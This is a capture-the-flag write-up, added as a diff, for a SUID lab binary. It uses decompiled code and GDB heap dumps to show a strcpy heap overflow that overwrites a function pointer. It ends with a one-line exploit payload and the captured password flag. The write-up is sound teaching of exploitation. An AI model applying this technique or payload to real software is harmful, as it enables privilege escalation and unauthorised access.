@@ -1,0 +1,110 @@
+# Level 6
+
+Binary: 32-bit ELF, SUID level7, dynamically linked.
+
+## Analysis
+
+### Ghidra output
+
+```c
+void n(void) {
+    system("/bin/cat /home/user/level7/.pass");
+}
+
+void m(void) {
+    puts("Nope");
+}
+
+int main(int argc, char **argv) {
+    char *buf = malloc(0x40);          // 64 bytes on heap
+    void (**fn)(void) = malloc(4);     // 4 bytes, holds a function pointer
+    *fn = m;                            // fn → m()
+    strcpy(buf, argv[1]);              // NO bounds check
+    (*fn)();                            // call through the pointer
+}
+```
+
+Two heap chunks are allocated in order:
+- `buf`: 64 bytes
+- `fn`: 4 bytes storing the address of `m`
+
+`strcpy(buf, argv[1])` has no size check. If argv[1] is long enough, it overflows past `buf` into `fn`, overwriting the function pointer.
+
+The goal: overwrite `fn` with the address of `n` so the indirect call spawns the flag printer.
+
+## Finding the offset
+
+### Address of n
+
+```
+(gdb) info functions
+...
+0x08048454  n
+```
+
+### Distance from buf to fn
+
+Set a breakpoint right before `strcpy` and dump the heap:
+
+```
+(gdb) b *0x080484c5
+(gdb) r $(python -c 'print "A"*100')
+
+(gdb) info registers eax
+eax            0x804a008      ← buf
+
+(gdb) x/40x $eax
+0x804a008:  0x00000000 0x00000000 0x00000000 0x00000000
+0x804a018:  0x00000000 0x00000000 0x00000000 0x00000000
+0x804a028:  0x00000000 0x00000000 0x00000000 0x00000000
+0x804a038:  0x00000000 0x00000000 0x00000000 0x00000000
+0x804a048:  0x00000000 0x00000011 0x08048468 0x00000000
+                        ↑         ↑
+                   chunk header   fn (holds 0x08048468 = m)
+```
+
+- `buf` at `0x0804a008`
+- `fn`  at `0x0804a050`
+- distance = `0x0804a050 - 0x0804a008` = `0x48` = **72 bytes**
+
+Layout:
+```
+[buf: 64 bytes of data] [chunk header: 8 bytes] [fn: 4 bytes] ...
+          ↑                     ↑                    ↑
+       0x0804a008          0x0804a048          0x0804a050
+```
+
+The chunk header includes the size field `0x11` (size = 16 | PREV_IN_USE flag).
+
+## Exploit
+
+Fill 72 bytes, then write `n`'s address (little-endian):
+
+```bash
+./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+```
+
+Output:
+```
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+Flag: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
+
+## Notes
+
+### Heap overflow vs stack overflow
+
+No return address to hijack on the heap; we target a **function pointer** stored in the next allocation. The principle is the same as stack overflow: write past a buffer's boundary into adjacent memory that controls execution flow.
+
+### Why argv[1] (not stdin)?
+
+`strcpy` reads its source from `argv[1]`, so the payload is a command-line argument. Command-line args can't contain null bytes (execve uses null-terminated strings), so any address with `\x00` would be truncated. `0x08048454` has no null bytes, so it passes through unchanged.
+
+### Why 72 bytes?
+
+Heap chunks have metadata. glibc malloc on 32-bit uses 8 bytes of header per chunk:
+- `buf`: 64 bytes of user data, chunk occupies ~72 bytes total
+- `fn`: 4 bytes of user data, follows right after `buf`'s chunk
+
+So `fn`'s user data pointer = `buf` pointer + 72.
